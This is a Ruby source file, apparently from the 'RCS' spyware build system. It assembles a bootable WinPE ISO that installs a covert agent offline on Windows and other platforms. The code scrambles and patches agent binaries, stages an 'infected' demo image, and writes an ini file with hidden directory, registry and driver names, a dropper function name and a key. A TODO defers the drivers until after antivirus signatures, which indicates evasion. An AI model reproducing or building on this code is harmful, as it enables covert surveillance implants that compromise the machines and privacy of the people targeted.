#
# Bootable ISO for offline install
#

# from RCS::Common
require 'rcs-common/trace'

module RCS
module DB

class BuildISO < Build

  def initialize
    super
    @platform = 'offline'
  end

  def load(params)
    trace :debug, "Build: load: #{params}"

    params['platform'] = @platform
    super
  end

  def generate(params)
    trace :debug, "Build: generate: #{params}"

    names = {}

    params['platforms'].each do |platform|
      build = Build.factory(platform.to_sym)

      build.load({'_id' => @factory._id})
      build.unpack
      begin
        build.patch params['binary'].dup
      rescue NoLicenseError => e
        trace :warn, "Build: #{e.message}"
        # trap in case of no license for a platform
        build.clean
        next
      end
      build.scramble

      names = build.scrambled.dup if platform == 'windows'

      # copy the scrambled files in our directories
      build.scrambled.keep_if {|k, v| k != :dir and k != :reg}.each_pair do |k, v|
        FileUtils.mkdir_p(path("winpe/RCSPE/files/#{platform.upcase}"))
        FileUtils.cp(File.join(build.tmpdir, v), path("winpe/RCSPE/files/#{platform.upcase}/" + v))
      end

      FileUtils.cp(File.join(build.tmpdir, 'demo_image'), path("winpe/RCSPE/files/#{platform.upcase}/infected.bmp")) if params['demo']

      build.clean
    end

    # if mac was not built, delete it to avoid errors during installation without osx
    if Dir[path("winpe/RCSPE/files/OSX/*")].size == 1
      FileUtils.rm_rf(path("winpe/RCSPE/files/OSX"))
    end

    key = Digest::MD5.digest(@factory.logkey).unpack('H2').first.upcase

    # calculate the function name for the dropper
    funcname = 'F' + Digest::MD5.digest(@factory.logkey).unpack('H*').first[0..4]

    # write the ini file
    File.open(path('winpe/RCSPE/RCS.ini'), 'w') do |f|
      f.puts "[RCS]"
      f.puts "VERSION=#{File.read(Dir.pwd + '/config/VERSION')}"
      f.puts "HUID=#{@factory.ident}"
      f.puts "HCORE=#{names[:core]}"
      f.puts "HCONF=#{names[:config]}"
      f.puts "CODEC=#{names[:codec]}"
      f.puts "DLL64=#{names[:core64]}"

      # TODO: reinsert those after AV signature
      f.puts "HDRV=null"
      f.puts "DRIVER64=null"
      #f.puts "HDRV=#{names[:driver]}"
      #f.puts "DRIVER64=#{names[:driver64]}"

      f.puts "HDIR=#{names[:dir]}"
      f.puts "HREG=#{names[:reg]}"
      f.puts "HSYS=ndisk.sys"
      f.puts "HKEY=#{key}"
      f.puts "FUNC=" + funcname
      f.puts "MASK=#{params['dump_mask']}"
    end

  end

  def pack(params)
    trace :debug, "Build: pack: #{params}"

    # create the ISO image
    CrossPlatform.exec path('oscdimg'), "-u1 -l#{@factory.ident} -b#{path('winpe/boot/etfsboot.com')} #{path('winpe')} #{path('output.iso')}"
    raise "ISO creation failed" unless File.exist? path('output.iso')

    @outputs = ['output.iso']
  end

end

end #DB::
end #RCS::
